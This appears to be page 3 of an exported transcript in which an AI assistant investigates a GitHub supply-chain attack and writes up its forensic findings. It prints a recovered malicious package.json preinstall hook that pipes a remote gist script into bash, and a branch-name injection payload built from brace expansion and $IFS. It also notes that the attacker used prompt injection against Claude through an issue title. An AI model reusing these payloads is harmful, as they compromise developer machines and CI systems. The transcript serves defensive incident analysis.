+<div class="message tool-reply" id="msg-2026-02-18T17-06-59-856Z"><div class="message-header"><span class="role-label">Tool reply</span><a href="#msg-2026-02-18T17-06-59-856Z" class="timestamp-link"><time datetime="2026-02-18T17:06:59.856Z" data-timestamp="2026-02-18T17:06:59.856Z">2026-02-18T17:06:59.856Z</time></a></div><div class="message-content"><div class="tool-result"><div class="truncatable"><div class="truncatable-content"><pre>The file /Users/mbg/Documents/Source/mbrg/raptor/.out/oss-forensics-20260218_105712/forensic-report.md has been updated successfully.</pre></div><button class="expand-btn">Show more</button></div></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T17-07-04-231Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T17-07-04-231Z" class="timestamp-link"><time datetime="2026-02-18T17:07:04.231Z" data-timestamp="2026-02-18T17:07:04.231Z">2026-02-18T17:07:04.231Z</time></a></div><div class="message-content">
+<div class="thinking"><div class="thinking-label">Thinking</div><p>Great, I've updated the report with:
+1. The glthubactionstesting account as a potential related account
+2. The newrelic/test-oac-repository as a second target3. The branch name injection technique used</p>
+<p>Let me provide a summary for the user.</p></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T17-07-11-268Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T17-07-11-268Z" class="timestamp-link"><time datetime="2026-02-18T17:07:11.268Z" data-timestamp="2026-02-18T17:07:11.268Z">2026-02-18T17:07:11.268Z</time></a></div><div class="message-content">
+<div class="assistant-text"><p>Report updated with all findings. Here's a summary:</p>
+<h2>Key Findings</h2>
+<h3>1. Recovered Malicious Payloads (from preserved fork commits)</h3>
+<pre><code class="language-json">{
+    &quot;name&quot;: &quot;test&quot;,
+    &quot;version&quot;: &quot;1.0.0&quot;,
+    &quot;scripts&quot;: {
+      &quot;preinstall&quot;: &quot;curl -sSfL https://gist.githubusercontent.com/glthub-actions/7b3f87dac.../run.sh | bash&quot;
+    }
+}
+</code></pre>
+<p>4 commits recovered showing the attacker updated the payload multiple times (Jan 28-30).</p>
+<h3>2. glthubactionstesting Account</h3>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Created</td>
+<td><strong>2026-02-02</strong> (2 days after glthub-actions stopped)</td>
+</tr>
+<tr>
+<td>User ID</td>
+<td>258947423</td>
+</tr>
+<tr>
+<td>Status</td>
+<td>Dormant (0 repos, 0 activity)</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Suspicious timing</strong> - could be a backup account created before glthub-actions was suspended.</p>
+<h3>3. NewRelic Second Target</h3>
+<p><strong>newrelic/test-oac-repository</strong> was attacked on Jan 27, 2026 (day before cline):
+- Branch name injection: <code>{curl,-sSFL,...}${IFS}|${IFS}bash</code>
+- PR #74 with malicious payload
+- Repo is now 404 (deleted)</p>
+<p>Multiple researchers (bhtestacount123, r3s1l3n7) also tested this repo - likely bug bounty hunting.</p>
+<h3>4. Attack Techniques Used</h3>
+<table>
+<thead>
+<tr>
+<th>Technique</th>
+<th>Target</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Prompt injection</strong></td>
+<td>cline/cline Issue #8904</td>
+<td>Inject instructions into Claude via issue title</td>
+</tr>
+<tr>
+<td><strong>Branch name injection</strong></td>
+<td>newrelic/test-oac-repository</td>
+<td>Bash brace expansion + <code>$IFS</code> in branch names</td>
+</tr>
+<tr>
+<td><strong>preinstall script</strong></td>
+<td>Malicious package.json</td>
+<td><code>curl | bash</code> to download remote payload</td>
+</tr>
+</tbody>
+</table>
+<p>The threat actor is sophisticated - testing multiple injection vectors across different targets.</p></div></div></div>
+<div class="message user" id="msg-2026-02-18T17-09-20-273Z"><div class="message-header"><span class="role-label">User</span><a href="#msg-2026-02-18T17-09-20-273Z" class="timestamp-link"><time datetime="2026-02-18T17:09:20.273Z" data-timestamp="2026-02-18T17:09:20.273Z">2026-02-18T17:09:20.273Z</time></a></div><div class="message-content">
+<div class="user-content"><p>what was the newrelic repo about?</p></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T17-09-27-450Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T17-09-27-450Z" class="timestamp-link"><time datetime="2026-02-18T17:09:27.450Z" data-timestamp="2026-02-18T17:09:27.450Z">2026-02-18T17:09:27.450Z</time></a></div><div class="message-content">
+<div class="thinking"><div class="thinking-label">Thinking</div><p>The user is asking what the newrelic/test-oac-repository was about. I mentioned it was a test repository for NewRelic but I don't have concrete evidence of what it actually was. Let me search for more information about this repo - maybe in GH Archive events or via web search.</p></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T17-09-28-317Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T17-09-28-317Z" class="timestamp-link"><time datetime="2026-02-18T17:09:28.317Z" data-timestamp="2026-02-18T17:09:28.317Z">2026-02-18T17:09:28.317Z</time></a></div><div class="message-content">
+<div class="assistant-text"><p>Good question - I made an assumption but don't have concrete evidence. Let me investigate what that repo actually was.</p></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T17-09-28-718Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T17-09-28-718Z" class="timestamp-link"><time datetime="2026-02-18T17:09:28.718Z" data-timestamp="2026-02-18T17:09:28.718Z">2026-02-18T17:09:28.718Z</time></a></div><div class="message-content">
+<div class="tool-use" data-tool-id="toolu_01CFBgSBEyeqaGQ4iB7snW3E"><div class="tool-header"><span class="tool-icon">⚙</span> WebSearch</div><div class="truncatable"><div class="truncatable-content"><pre class="json">{
+  &#34;query&#34;: &#34;newrelic test-oac-repository GitHub 2026&#34;
+}</pre></div><button class="expand-btn">Show more</button></div></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T17-09-31-986Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T17-09-31-986Z" class="timestamp-link"><time datetime="2026-02-18T17:09:31.986Z" data-timestamp="2026-02-18T17:09:31.986Z">2026-02-18T17:09:31.986Z</time></a></div><div class="message-content">
+<div class="tool-use bash-tool" data-tool-id="toolu_01GiDerje63TVFMQHpUfjJtr">
+<div class="tool-header"><span class="tool-icon">$</span> Bash</div>
+<div class="tool-description">Search evidence for newrelic repo details</div><div class="truncatable"><div class="truncatable-content"><pre class="bash-command">source .venv/bin/activate &amp;&amp; python -c &#34;
+import json
+
+# Search evidence for more details about newrelic/test-oac-repository
+with open(&#39;.out/oss-forensics-20260218_105712/evidence.json&#39;, &#39;r&#39;) as f:
+    data = json.load(f)
+
+for item in data:
+    if isinstance(item, dict):
+        item_str = json.dumps(item)
+        if &#39;test-oac&#39; in item_str.lower() or &#39;newrelic&#39; in item_str.lower():
+            if &#39;oac&#39; in item_str.lower():
+                print(json.dumps(item, indent=2)[:1500])
+                print(&#39;---&#39;)
+&#34; | head -100</pre></div><button class="expand-btn">Show more</button></div>
+</div></div></div>
+<div class="message tool-reply" id="msg-2026-02-18T17-09-33-178Z"><div class="message-header"><span class="role-label">Tool reply</span><a href="#msg-2026-02-18T17-09-33-178Z" class="timestamp-link"><time datetime="2026-02-18T17:09:33.178Z" data-timestamp="2026-02-18T17:09:33.178Z">2026-02-18T17:09:33.178Z</time></a></div><div class="message-content"><div class="tool-result"><div class="truncatable"><div class="truncatable-content"><pre>Web search results for query: &quot;newrelic test-oac-repository GitHub 2026&quot;
+
+
+REMINDER: You MUST include the sources above in your response to the user using markdown hyperlinks.</pre></div><button class="expand-btn">Show more</button></div></div></div></div>
+<div class="message tool-reply" id="msg-2026-02-18T17-09-33-200Z"><div class="message-header"><span class="role-label">Tool reply</span><a href="#msg-2026-02-18T17-09-33-200Z" class="timestamp-link"><time datetime="2026-02-18T17:09:33.200Z" data-timestamp="2026-02-18T17:09:33.200Z">2026-02-18T17:09:33.200Z</time></a></div><div class="message-content"><div class="tool-result tool-error"><div class="truncatable"><div class="truncatable-content"><pre>The user doesn&#x27;t want to take this action right now. STOP what you are doing and wait for the user to tell you how to proceed.</pre></div><button class="expand-btn">Show more</button></div></div></div></div>
+<div class="message user" id="msg-2026-02-18T17-09-33-200Z"><div class="message-header"><span class="role-label">User</span><a href="#msg-2026-02-18T17-09-33-200Z" class="timestamp-link"><time datetime="2026-02-18T17:09:33.200Z" data-timestamp="2026-02-18T17:09:33.200Z">2026-02-18T17:09:33.200Z</time></a></div><div class="message-content">
+<div class="assistant-text"><p>[Request interrupted by user for tool use]</p></div></div></div>
+        
+
+<div class="pagination">
+<a href="index.html" class="index-link">Index</a>
+<a href="page-002.html">&larr; Prev</a>
+<a href="page-001.html">1</a>
+<a href="page-002.html">2</a>
+<span class="current">3</span>
+<a href="page-004.html">4</a>
+<a href="page-004.html">Next &rarr;</a>
+</div>
+
+    </div>
+    <script>
+document.querySelectorAll('time[data-timestamp]').forEach(function(el) {
+    const timestamp = el.getAttribute('data-timestamp');
+    const date = new Date(timestamp);
+    const now = new Date();
+    const isToday = date.toDateString() === now.toDateString();
+    const timeStr = date.toLocaleTimeString(undefined, { hour: '2-digit', minute: '2-digit' });
+    if (isToday) { el.textContent = timeStr; }
+    else { el.textContent = date.toLocaleDateString(undefined, { month: 'short', day: 'numeric' }) + ' ' + timeStr; }
+});
+document.querySelectorAll('pre.json').forEach(function(el) {
+    let text = el.textContent;
+    text = text.replace(/"([^"]+)":/g, '<span style="color: #ce93d8">"$1"</span>:');
+    text = text.replace(/: "([^"]*)"/g, ': <span style="color: #81d4fa">"$1"</span>');
+    text = text.replace(/: (\d+)/g, ': <span style="color: #ffcc80">$1</span>');
+    text = text.replace(/: (true|false|null)/g, ': <span style="color: #f48fb1">$1</span>');
+    el.innerHTML = text;
+});
+document.querySelectorAll('.truncatable').forEach(function(wrapper) {
+    const content = wrapper.querySelector('.truncatable-content');
+    const btn = wrapper.querySelector('.expand-btn');
+    if (content.scrollHeight > 250) {
+        wrapper.classList.add('truncated');
+        btn.addEventListener('click', function() {
+            if (wrapper.classList.contains('truncated')) { wrapper.classList.remove('truncated'); wrapper.classList.add('expanded'); btn.textContent = 'Show less'; }
+            else { wrapper.classList.remove('expanded'); wrapper.classList.add('truncated'); btn.textContent = 'Show more'; }
+        });
+    }
+});
+</script>
+</body>
+</html>
